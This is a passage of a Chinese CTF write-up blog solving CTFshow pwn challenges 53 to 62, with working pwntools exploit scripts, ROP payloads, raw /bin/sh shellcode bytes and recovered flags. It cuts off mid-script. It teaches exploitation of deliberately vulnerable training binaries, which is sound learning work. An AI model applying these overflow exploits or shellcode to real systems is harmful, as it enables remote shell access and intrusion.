<p>0x10这边canary差不多4个，然后我还要避开之后继续溢出，就是0x10+4-4</p>
<p>所以这边填完爆出来的canary就应该再填个0x10个数据</p>
<p>然后跟上flag函数</p>
<p>elf &#x3D; ELF(‘.&#x2F;pwn53’) </p>
<p>flag &#x3D; elf.sym[‘flag’]</p>
<p>OK我们来写代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>p = remote(&quot;pwn.challenge.ctf.show&quot;,28299)<br> <br>canary = b&#x27;&#x27;<br>for i in range(4):<br>    for guess in range(256):<br>        p = remote(&quot;pwn.challenge.ctf.show&quot;,28299)<br>        p.sendlineafter(&#x27;&gt;&#x27;,&#x27;200&#x27;)<br>        payload = cyclic(0x30 - 0x10) + canary + p8(guess)<br>        p.sendafter(&#x27;$ &#x27;,payload)<br>        answer = str(p.recv())<br>        if &quot;Canary Value Incorrect!&quot; not in answer:<br>            canary += p8(guess)<br>            break<br>        else:<br>            p.close()<br>p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28299)<br>elf = ELF(&#x27;./pwn53&#x27;)<br>flag = elf.sym[&#x27;flag&#x27;]<br>payload = cyclic(0x30 - 0x10) + canary + p32(0)*4 + p32(flag)<br>p.sendlineafter(&#x27;&gt;&#x27;,&#x27;-1&#x27;)<br>p.sendafter(&#x27;$ &#x27;,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759665183910-88dad061-9cf2-42ac-84ac-ac7595dc76ff.png" srcset="/img/loading.gif" lazyload></p>
<p>ctfshow{d63a0605-5f68-40ab-b304-399fef5c3469}</p>
<h2 id="pwn54"><a href="#pwn54" class="headerlink" title="pwn54"></a>pwn54</h2><p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759662565060-2289be3d-5b09-444e-8874-b3ce3db008c8.png" srcset="/img/loading.gif" lazyload></p>
<p>保护：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759665268674-c163b989-81e5-4e95-a423-66176f2161b5.png" srcset="/img/loading.gif" lazyload></p>
<p>看看主函数：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759663037561-56077b8d-9dbf-4dd9-b6f5-96467b78c896.png" srcset="/img/loading.gif" lazyload></p>
<p>flag函数就在下边，我们只要让strcmp(s1,s)为0即可</p>
<p>这边s1是填进去的，s是自带的</p>
<p>溢出点在于<img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759665424658-6ebf04cb-3a49-4fe3-99d6-0c0599961644.png" srcset="/img/loading.gif" lazyload></p>
<p>这个v5可以写无数位</p>
<p>而后边的puts函数又会输出v5</p>
<p>puts函数会一直输出直到遇到换行符或者空白，所以只要password前面全部都塞满了垃圾，把换行符和空白全部填满垃圾，puts函数就能一直输出</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759666627684-a58cccf4-21d4-490f-8f24-de56e3bb64c6.png" srcset="/img/loading.gif" lazyload></p>
<p>而v5后边就是是，所以会一起把后边s里的password输出出来</p>
<p>我直接传0x160个a，就直接会把密码给puts出来</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759666708184-e006da6e-d5ef-424e-94b6-fc0ac640e1bb.png" srcset="/img/loading.gif" lazyload></p>
<p>看见把密码直接吐出来了，那我们再来一遍把这个填进去就好啦</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759666745255-82e55c5b-1e70-491a-8d11-64500a1b5fc5.png" srcset="/img/loading.gif" lazyload></p>
<p>ctfshow{ae5e8247-9132-474f-a404-136b2520ed8e}</p>
<h2 id="pwn55"><a href="#pwn55" class="headerlink" title="pwn55"></a>pwn55</h2><p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759666772586-ebb55478-10cf-44dd-88bf-c6bad3d53705.png" srcset="/img/loading.gif" lazyload></p>
<p>保护：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759666862694-63065522-8330-445d-99f0-9f78edc1b8c9.png" srcset="/img/loading.gif" lazyload></p>
<p>这边可以看到是32位的，只开了NX保护</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759666898104-a97e6a30-d1e7-4b98-a4e7-d6a77a120922.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759666920593-f9280d1b-83d3-4e2e-abd0-4d98ae31d26a.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759666915076-8f9098eb-88f4-417b-a606-106b1083ca55.png" srcset="/img/loading.gif" lazyload></p>
<p>可以看到ctfshow函数里存在栈溢出漏洞0x2C+4</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759667024652-b1335ac4-98cb-47b9-bb50-011dc3c75ea5.png" srcset="/img/loading.gif" lazyload></p>
<p>那我肯定是定位到flag函数的</p>
<p>这边可以看到会把flag内容填到s里</p>
<p>读取有条件，那就是flag1 &amp;&amp; flag2 &amp;&amp; a1 &#x3D;&#x3D; 0xBDBDBDBD</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759667104259-e1973b89-5df4-4764-8f85-30d776fef67e.png" srcset="/img/loading.gif" lazyload></p>
<p>flag1和flag2的值在这边</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759667132731-733e79f5-661b-4889-806a-294afcf39f93.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759667125356-3dbbbbf1-2570-44cc-9799-6b332037921e.png" srcset="/img/loading.gif" lazyload></p>
<p>flag1只要调用函数就直接是1了，flag2则需要我们先调用flag1的函数，后边再以0xACACACAC作为参数调用一次flag2的函数</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759667180075-fa33d2ee-e548-42d0-adb0-be9551fd3a0f.png" srcset="/img/loading.gif" lazyload></p>
<p>这两步做完之后调用参数为0xBDBDBDBD的flag函数即可</p>
<p>很简单，三个函数传两个参数即可</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759667339542-d9d9e572-2339-443d-986d-157a998bfcfb.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759667357043-f65f6c41-7c04-4fb7-b2ca-291b44836418.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759667377763-61d8678a-3c6f-406a-b559-bd813c18a498.png" srcset="/img/loading.gif" lazyload></p>
<p>写代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context.log_level=&quot;debug&quot;<br>io=remote(&quot;pwn.challenge.ctf.show&quot;,28194)<br>flag1=0x08048586<br>flag2=0x0804859D<br>flag=0x8048606<br>padding=0x2C+4<br>payload=b&quot;a&quot;*padding+p32(flag1)+p32(flag2)+p32(flag)+p32(0xACACACAC)+p32(0xBDBDBDBD)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759667468296-e1e17714-03c9-497e-bcc7-8c6b8cdfaf36.png" srcset="/img/loading.gif" lazyload></p>
<p>ctfshow{a160b4f4-f733-4bf2-b2aa-288c6ee77c65}</p>
<h2 id="pwn56"><a href="#pwn56" class="headerlink" title="pwn56"></a>pwn56</h2><p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759667497402-42682786-09b9-48d1-890c-8601d00b65ea.png" srcset="/img/loading.gif" lazyload></p>
<p>shellcode？</p>
<p>保护：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759667541451-c34ceb49-a4bd-4f9d-8b2f-e54c689a6a01.png" srcset="/img/loading.gif" lazyload></p>
<p>静态还是32位还没有NX，这不是爽飞了</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759668030481-c66472a7-4a3c-4443-ae71-4bfdb68b079c.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759668052913-71c789e5-54aa-4dae-a9f3-a2c5ad301e9d.png" srcset="/img/loading.gif" lazyload></p>
<p>这题纯是展示题，给你展示一下32位的shellcode长啥样</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759668313844-79f3d685-24e6-4c9f-948c-631c1670d34f.png" srcset="/img/loading.gif" lazyload></p>
<p>先把h、&#x2F;&#x2F;sh、&#x2F;bin先后逐一压入栈，以保证之后调用顺序会是&#x2F;bin&#x2F;&#x2F;sh，然后还避免了引入空字节</p>
<p>然后把这个指针的值给赋给EBX寄存器，保证接下来会是第一个参数指向文件路径，后边把11，也就是execve的系统调用号给压入栈</p>
<p>接下来调用的时候就提权了</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759668629472-702223b9-975b-45e0-bba7-e6b5d2e776ef.png" srcset="/img/loading.gif" lazyload></p>
<p>具体没什么好说的，就是展示题而已</p>
<p>ctfshow{010baf1d-dcfa-4c19-948a-0c62b0e6b715}</p>
<h2 id="pwn57"><a href="#pwn57" class="headerlink" title="pwn57"></a>pwn57</h2><p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759668653876-558ae8f1-f4aa-428b-87af-2d98e14c4bb7.png" srcset="/img/loading.gif" lazyload></p>
<p>也是个展示题</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759669310752-e2ce3ae7-d272-45b8-b7da-2a1a1c808bd9.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759669271178-f1340ebf-4098-4171-a9d0-8105b879ff93.png" srcset="/img/loading.gif" lazyload></p>
<p>64位会麻烦很多，很多很多</p>
<p>上来先把RAX的值压入栈，也不知道是多少，先利用栈操作调整RSP</p>
<p>然后我们清空rdx和rsi</p>
<p>后边字节一起把”&#x2F;bin&#x2F;&#x2F;sh”的小端序ASCII值传给rbx，两个斜杠方便64位系统处理</p>
<p>在后边就把这个rbx给压入栈，然后再将栈指针rsp也压进去</p>
<p>然后现在的栈指针就会指向这个rbx</p>
<p>现在把栈顶的值弹出给rdi，那rdi就会是&#x2F;bin&#x2F;&#x2F;sh了</p>
<p>后边我们只需要把这个execve的系统调用号0x3B给移动到al，即rax的低八位</p>
<p>然后我们执行系统调用的时候就会执行一个参数为&#x2F;bin&#x2F;&#x2F;sh的execve函数</p>
<p>即成功启动一个shell</p>
<p>至于flag获取跟上题一样，直接cat就是了</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759669624162-a15cbea3-f396-4c2e-9f62-2b993b5debb4.png" srcset="/img/loading.gif" lazyload></p>
<p>ctfshow{85cdc998-5ceb-4129-a991-c1aa086b0aa2}</p>
<h2 id="pwn58"><a href="#pwn58" class="headerlink" title="pwn58"></a>pwn58</h2><h2 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759669654439-c2ce9e68-25ca-455f-bbda-d6c21d12f2e7.png" srcset="/img/loading.gif" lazyload></h2><p>保护：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759669728714-b7fe76bd-9605-4d4e-a59e-278a5d2249d7.png" srcset="/img/loading.gif" lazyload></p>
<p>跟题目说的一样，是32位无限制的</p>
<p>无RX，所以我们可以直接构造shellcode，会方便很多</p>
<p>main函数不能反编译，那我们只能看汇编语言了</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759669914541-e4c3623a-c06e-45cd-9b66-faef2f8a5979.png" srcset="/img/loading.gif" lazyload></p>
<p>main函数这边会call去ctfshow函数</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759669899263-affb6d9a-a319-483b-9ed5-0eb993f98fdc.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759669934050-5f4d74cd-1b7f-4175-82cc-2512194f649e.png" srcset="/img/loading.gif" lazyload></p>
<p>这个ctfshow函数好啊，自带gets函数，还会return出来，我们直接在这边构造shellcode填进去</p>
<p>好像现在的shellcode都是直接shellcraft的，也没试过直接写汇编</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context.log_level=&quot;debug&quot;<br>io=remote(&quot;pwn.challenge.ctf.show&quot;,28249)<br>shellcode=asm(shellcraft.sh())<br>io.sendline(shellcode)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759670096278-d652d8ed-4a73-4cea-ba0f-718f973cddf3.png" srcset="/img/loading.gif" lazyload></p>
<p>直接就可以cat到了</p>
<p>ctfshow{740043b5-e5fc-4935-a2c0-66f6b05788d5}</p>
<h2 id="pwn59"><a href="#pwn59" class="headerlink" title="pwn59"></a>pwn59</h2><p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759670122239-2a9bea84-efb1-4516-9ccb-3b08bddbb8e1.png" srcset="/img/loading.gif" lazyload></p>
<p>没什么区别，依旧保护全关</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759670169784-dbb83e37-4954-4b64-b1fb-fd0f6e88dc70.png" srcset="/img/loading.gif" lazyload></p>
<p>这边直接看main函数吧</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759670188421-7ad1f69a-1651-41be-ac80-7142c2705eb8.png" srcset="/img/loading.gif" lazyload></p>
<p>main函数这边还是会调用ctfshow这个函数</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759670213447-d1fe64a8-6c4c-443e-a080-ba0195f15ab2.png" srcset="/img/loading.gif" lazyload></p>
<p>那我们还是在这个地方写shellcode，一模一样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context.log_level=&quot;debug&quot;<br>io=remote(&quot;pwn.challenge.ctf.show&quot;,28288)<br>shellcode=asm(shellcraft.sh())<br>io.sendline(shellcode)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759670282770-cd1c21f9-e30f-4f17-a6ab-c13fc951b867.png" srcset="/img/loading.gif" lazyload></p>
<p>欸失败了</p>
<p>其实是这个地方没说明要构造64位的shellcode，什么都不写默认构造32位的</p>
<p>所以代码应该如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context.log_level=&quot;debug&quot;<br>context.arch=&#x27;amd64&#x27;<br>io=remote(&quot;pwn.challenge.ctf.show&quot;,28288)<br>shellcode=asm(shellcraft.sh())<br>io.sendline(shellcode)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759670367320-6a048731-b7fa-4d94-8ffa-0ec260b158b8.png" srcset="/img/loading.gif" lazyload></p>
<p>这边可以得到flag</p>
<p>ctfshow{2830b7cb-4e16-4be2-b01b-17ac242d90e9}</p>
<h2 id="pwn60"><a href="#pwn60" class="headerlink" title="pwn60"></a>pwn60</h2><p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759670402012-946d83fe-39e9-4105-8b48-f280c6e9467f.png" srcset="/img/loading.gif" lazyload></p>
<p>入门难度的shellcode</p>
<p>这边还是先看保护：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759670587907-48370072-289d-4e3e-894b-0cbbdfb1d97a.png" srcset="/img/loading.gif" lazyload></p>
<p>这边依旧全无，只要开RX基本上就和shellcode无关了</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759670624638-e0a5bce3-eec2-4beb-a95a-cdd6738af7c7.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759670647034-e2c55931-fafc-4dbb-8627-9b0036c0d2d2.png" srcset="/img/loading.gif" lazyload></p>
<p>会把s的内容复制到buf2里边去，但是不清楚哪里会执行，我们动调vmmap看看</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1759670782115-d459988b-d145-4659-b256-b34590d9df15.png" srcset="/img/loading.gif" lazyload></p>
<p>这边可以看到在0x8048000到0x8049000这边才有可执行权限</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760255640394-65a40700-1bc3-41c4-980c-e8b264282b60.png" srcset="/img/loading.gif" lazyload></p>
<p>这特么是啥，为什么老版本显示有权限，新版本显示没权限，这啥道理</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760256123995-3cbde3de-e49b-40bf-8aaf-5fd203900a07.png" srcset="/img/loading.gif" lazyload></p>
<p>好像是这样子</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760255776752-f4f3b427-4a9e-4d8d-9afa-9ee36e7b54f8.png" srcset="/img/loading.gif" lazyload></p>
<p>我去，用ctfshow自带的还真出现了，那我们以后做ctfshow都用这个虚拟机了</p>
<p>然后继续看看</p>
<p>所以我们这边可以做到讲漏洞程序shellcode写在这个地方，这个地方也是可执行的，但是到让他执行还有一步，就是精准投到执行的部分，也就是让他填到返回地址上去。</p>
<p>如果不填到返回地址CPU会弹回 main 函数。但如果返回地址被覆盖为shellcode的地址（<code>buf_addr</code>），CPU就会跳转到<code>buf_addr</code>处，并将那里的数据当作指令来执行。此时，shellcode就从数据变成了被执行的代码。</p>
<p>大概明白意思之后，我们就明确了目标：</p>
<p>“找到偏移量，找到s到ret的长度”</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760257153813-2fe38705-1ce4-4d8a-b234-0e33f3045bdf.png" srcset="/img/loading.gif" lazyload></p>
<p>这边可以直接往多了输入，然后看在哪里崩溃</p>
<p>cyclic 200</p>
<p>发现没跑完就停了</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760257318937-80ff2b5c-613a-4f06-9a62-958d27184e22.png" srcset="/img/loading.gif" lazyload></p>
<p>就跑到这边，那我们直接</p>
<p>r &lt; &lt;(echo ‘aaaabaaacaaadaaae…’)</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760257719314-3774273b-272f-4e8e-900f-42c87096159e.png" srcset="/img/loading.gif" lazyload></p>
<p>崩溃完看看停哪了，查看 EIP（32位系统）或 RIP（64位系统）寄存器的值</p>
<p>info registers eip</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760257685310-c88a8aed-c0df-4327-af07-562dcdce80f9.png" srcset="/img/loading.gif" lazyload></p>
<p>其实也不用输命令看，这不直接看见了吗</p>
<p>然后cyclic -l 0x62616164</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760257763592-46813f86-8a9e-478a-928a-b0ca64949771.png" srcset="/img/loading.gif" lazyload></p>
<p>数一下，偏移量就是112</p>
<p>所以我们写的命令一开始是shellcode，但是不知道shellcode多长，所以后边补齐112</p>
<p>shellcode &#x3D; asm(shellcraft.sh())</p>
<p>payload &#x3D; shellcode.ljust(112, b”a”) + p32(buf_addr)</p>
<p>所以我们代码的核心部分payload是需要shellcode,ljust()补齐的</p>
<p>好现在我们可以直接写payload了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context.log_level =&quot;debug&quot;<br>context.arch = &quot;i386&quot;<br>io=remote(&quot;pwn.challenge.ctf.show&quot;,28150)<br>buf_addr=0x0804A080<br>shellcode=asm(shellcraft.sh())<br>payload=shellcode.ljust(112,b&quot;a&quot;)+p32(buf_addr)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760258420099-8b0efc33-1e6d-43bb-be39-70baaf141516.png" srcset="/img/loading.gif" lazyload></p>
<p>ctfshow{3e5013bd-bd3a-4a82-ad25-a2326a24770a}</p>
<h2 id="pwn61"><a href="#pwn61" class="headerlink" title="pwn61"></a>pwn61</h2><p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760261280119-2a8a19ff-a865-43c8-a9a7-49a85e21b7aa.png" srcset="/img/loading.gif" lazyload></p>
<p>保护：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760258493836-c906e89c-34a9-4d60-a5c4-d2313ba985d2.png" srcset="/img/loading.gif" lazyload></p>
<p>带pie了老铁，地址随机化，但是没开NX，可以直接执行</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760258756795-e3c20824-579d-4158-b04e-6218a0260414.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760258747485-d9efb20e-ddc4-42d8-b442-7ddb888ef91e.png" srcset="/img/loading.gif" lazyload></p>
<p>这边溢出很好找，就是gets函数的v5有溢出而已</p>
<p>虽然有PIE随机地址，但printf会打印出v5的指针，也就是我们溢出部分的指针</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760259346546-2e154acf-e636-438f-b1a3-0aca943263b8.png" srcset="/img/loading.gif" lazyload></p>
<p>可以看到每一次输出的是不一样的，我们不能直接拿，需要去截取</p>
<p>r.recvuntil(‘[‘) </p>
<p>addr&#x3D;r.recvuntil(‘]’,drop&#x3D;True)#这意味着不截取最后的”]“</p>
<p>那我们一开始想的肯定是直接先栈溢出，然后去这个v5的地方，再填入我们的shellcode</p>
<p>payload直接这样子大功告成</p>
<p>但是发现不行，原因在于shellcode太长，v5装不下</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760259121380-6544e424-69f7-4add-8df9-84a9f9cb72e6.png" srcset="/img/loading.gif" lazyload>此外这边调用完gets函数之后啊，main函数下边有个leave</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1753418089328-ebd156f0-ab4c-4798-af8e-6e41607c4128.png" srcset="/img/loading.gif" lazyload></p>
<p>所以这个leave函数会直接释放栈空间</p>
<p>我们不能在leave前写，不然全释放完了，我们必须在leave之后写</p>
<p>v5长度：0x10 + 8（保存的rbp）+ 8（返回地址）</p>
<p>所以我们的payload需要先溢出，然后去v5地址，要写在v5长度0x10+8之后，再往后8位的位置，我们写到返回地址之后，这边就没有人截断我们的shellcode了</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760260383597-eb0a7b95-2af6-4cb4-bcfb-18d379cf88d9.png" srcset="/img/loading.gif" lazyload></p>
<p>主要是由于我们这边没有NX保护才能这样子干</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context(arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)<br>io=remote(&quot;pwn.challenge.ctf.show&quot;,28225)<br><br>io.recvuntil(&quot;[&quot;)<br>addr=io.recvuntil(&quot;]&quot;,drop=True)<br>addr=int(addr,16)<br>padding=0x10+8<br>shellcode=asm(shellcraft.sh())<br>payload=b&quot;a&quot;*padding+p64(addr+padding+8)+shellcode<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<p>这边一定注意addr&#x3D;int(addr,16)这一步，截断之后要记得转化类型，eval也可以，或许更好一点（eval的话直接addr&#x3D;eval(addr)即可）</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760261055140-24418181-d3ca-43f5-ba74-c4dd8205512a.png" srcset="/img/loading.gif" lazyload></p>
<p>ctfshow{1788a3fa-70ba-45c3-b2a3-2fcbb38ce75f}</p>
<h2 id="pwn62"><a href="#pwn62" class="headerlink" title="pwn62"></a>pwn62</h2><p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760261291629-a0531e06-ae32-45bd-8894-b4d3a169605a.png" srcset="/img/loading.gif" lazyload></p>
<p>保护：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760261258796-cba5bf1a-b6b1-402f-8d8e-90513aac4fe7.png" srcset="/img/loading.gif" lazyload></p>
<p>保护跟上一题一样，但是PIE，然后没NX，依旧shellcode</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760267506240-a7dd142e-4451-46e7-aa0c-5476f6755e6e.png" srcset="/img/loading.gif" lazyload></p>
<p>主函数看起来都差不多，一定要说的话可能只是跟刚刚比gets换成了read</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760267532931-b8718d18-544d-4c80-98c1-29ee390f2751.png" srcset="/img/loading.gif" lazyload></p>
<p>依旧溢出是 0x10+8</p>
<p>main函数后的leave还在，所以我们还是得等ret之后再写</p>
<p>但是不能按刚刚的算法做了</p>
<p>因为这边read只允许我们输入0x38个</p>
<p>我们这边已经溢出花了0x18个，然后返回地址加上直接花了0x20个了</p>
<p>所以我们只有0x18个可以用，也就是24字节内的shellcode</p>
<p>:::info<br>32 位 短字节 shellcode -&gt; 21 字节 \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</p>
<p>:::</p>
<p>:::info<br>64 位 较短的 shellcode -&gt; 23 字节 \x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</p>
<p>:::</p>
<p>正好有，写进去</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import 